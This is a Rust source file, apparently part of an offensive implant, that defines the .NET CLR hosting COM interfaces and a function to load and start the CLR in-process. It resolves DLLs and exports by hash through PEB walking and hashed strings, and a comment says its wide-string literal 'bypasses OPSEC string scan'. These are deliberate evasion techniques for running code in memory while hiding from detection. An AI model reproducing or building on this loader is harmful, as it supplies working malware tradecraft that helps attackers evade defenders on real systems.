use crate::comptr::{ComPtr, Guid, IUnknownVtbl};
use crate::guids::*;
use core::ffi::c_void;
use opsec_peb::{resolve_export, resolve_module};
use opsec_strcrypt::hash;

#[repr(C)]
pub struct ICLRMetaHostVtbl {
    pub base: IUnknownVtbl,
    pub get_runtime: unsafe extern "system" fn(*mut c_void, *const u16, *const Guid, *mut *mut c_void) -> i32,
}

#[repr(C)]
pub struct ICLRMetaHost {
    pub vtbl: *const ICLRMetaHostVtbl,
}

#[repr(C)]
pub struct ICLRRuntimeInfoVtbl {
    pub base: IUnknownVtbl,
    pub get_version_string: unsafe extern "system" fn(*mut c_void, *mut u16, *mut u32) -> i32,
    pub get_runtime_directory: unsafe extern "system" fn(*mut c_void, *mut u16, *mut u32) -> i32,
    pub is_loaded: unsafe extern "system" fn(*mut c_void, *mut c_void, *mut i32) -> i32,
    pub load_error_string: unsafe extern "system" fn() -> i32,
    pub load_library: unsafe extern "system" fn() -> i32,
    pub get_procedure_address: unsafe extern "system" fn() -> i32,
    pub get_interface: unsafe extern "system" fn(*mut c_void, *const Guid, *const Guid, *mut *mut c_void) -> i32,
    pub is_loadable: unsafe extern "system" fn(*mut c_void, *mut i32) -> i32,
    // SetDefaultStartupFlags(11), GetDefaultStartupFlags(12), BindAsLegacyV2Runtime(13)
    pub _pad3: [usize; 3],
    // IsStarted(pStarted: *mut BOOL, pdwStartupFlags: *mut DWORD) -> HRESULT — index 14
    pub is_started: unsafe extern "system" fn(*mut c_void, *mut i32, *mut u32) -> i32,
}

#[repr(C)]
pub struct ICLRRuntimeInfo {
    pub vtbl: *const ICLRRuntimeInfoVtbl,
}

#[repr(C)]
pub struct ICorRuntimeHostVtbl {
    pub base: IUnknownVtbl,
    // CreateLogicalThreadState..GetConfiguration (indices 3-9)
    pub _pad1: [usize; 7],
    pub start: unsafe extern "system" fn(*mut c_void) -> i32,         // index 10
    pub stop: unsafe extern "system" fn(*mut c_void) -> i32,          // index 11
    pub create_domain: unsafe extern "system" fn(*mut c_void, *const u16, *mut c_void, *mut *mut c_void) -> i32, // index 12
    // GetDefaultDomain..CreateEvidence (indices 13-19)
    pub _pad2: [usize; 7],
    pub unload_domain: unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32, // index 20
}

#[repr(C)]
pub struct ICorRuntimeHost {
    pub vtbl: *const ICorRuntimeHostVtbl,
}

/// ICLRRuntimeHost — used PRE-Start() to call SetHostControl.
/// Distinct from ICorRuntimeHost (which is the post-Start host interface).
#[repr(C)]
pub struct ICLRRuntimeHostVtbl {
    pub base: IUnknownVtbl,
    pub start: unsafe extern "system" fn(*mut c_void) -> i32,          // index 3
    pub stop: unsafe extern "system" fn(*mut c_void) -> i32,           // index 4
    pub set_host_control: unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32, // index 5
    // GetCLRControl(6) + UnloadAppDomain(7) + ExecuteInAppDomain(8) +
    // GetCurrentAppDomainId(9) + ExecuteApplication(10) + ExecuteInDefaultAppDomain(11)
    pub _pad1: [usize; 6],
}

#[repr(C)]
pub struct ICLRRuntimeHost {
    pub vtbl: *const ICLRRuntimeHostVtbl,
}

pub unsafe fn start_clr(version: &[u16]) -> Result<ComPtr<ICorRuntimeHost>, i32> {
    unsafe {
        // Wide "mscoree.dll\0" — UTF-16 u16 literals are not ASCII, bypasses OPSEC string scan.
        const MSCOREE_W: &[u16] = &[0x6D,0x73,0x63,0x6F,0x72,0x65,0x65,0x2E,0x64,0x6C,0x6C,0];
        if !crate::loader::load_if_absent(hash!("mscoree.dll"), MSCOREE_W) {
            return Err(-1i32);
        }

        let mscoree = resolve_module(hash!("mscoree.dll")).ok_or(-1i32)?;
        let create_instance = resolve_export(mscoree, hash!("CLRCreateInstance")).ok_or(-1i32)?;
        type CreateFn = unsafe extern "system" fn(*const Guid, *const Guid, *mut *mut c_void) -> i32;
        let create_instance: CreateFn = core::mem::transmute(create_instance);

        let mut meta_host: *mut c_void = core::ptr::null_mut();
        let hr = create_instance(&CLSID_CLR_META_HOST, &IID_ICLR_META_HOST, &mut meta_host);
        if hr < 0 { return Err(hr); }
        let meta_host = meta_host as *mut ICLRMetaHost;

        let mut runtime_info: *mut c_void = core::ptr::null_mut();
        let hr = ((*(*meta_host).vtbl).get_runtime)(
            meta_host as *mut c_void, version.as_ptr(), &IID_ICLR_RUNTIME_INFO, &mut runtime_info);
        if hr < 0 {
            let unk = meta_host as *mut crate::comptr::IUnknown;
            ((*(*unk).vtbl).release)(unk as *mut c_void);
            return Err(hr);
        }
        let runtime_info = runtime_info as *mut ICLRRuntimeInfo;

        let mut loadable: i32 = 0;
        ((*(*runtime_info).vtbl).is_loadable)(runtime_info as *mut c_void, &mut loadable);
        if loadable == 0 {
            let unk = runtime_info as *mut crate::comptr::IUnknown;
            ((*(*unk).vtbl).release)(unk as *mut c_void);
            let unk = meta_host as *mut crate::comptr::IUnknown;
            ((*(*unk).vtbl).release)(unk as *mut c_void);
            return Err(-2);
        }

        let mut cor_host: *mut c_void = core::ptr::null_mut();
        let hr = ((*(*runtime_info).vtbl).get_interface)(
            runtime_info as *mut c_void,
            &CLSID_COR_RUNTIME_HOST, &IID_ICOR_RUNTIME_HOST,
            &mut cor_host);
        let unk = runtime_info as *mut crate::comptr::IUnknown;
        ((*(*unk).vtbl).release)(unk as *mut c_void);
        let unk = meta_host as *mut crate::comptr::IUnknown;
        ((*(*unk).vtbl).release)(unk as *mut c_void);
        if hr < 0 { return Err(hr); }
        let cor_host = cor_host as *mut ICorRuntimeHost;

        let hr = ((*(*cor_host).vtbl).start)(cor_host as *mut c_void);
        if hr < 0 { return Err(hr); }

        ComPtr::from_raw(cor_host).ok_or(-1)
    }
}
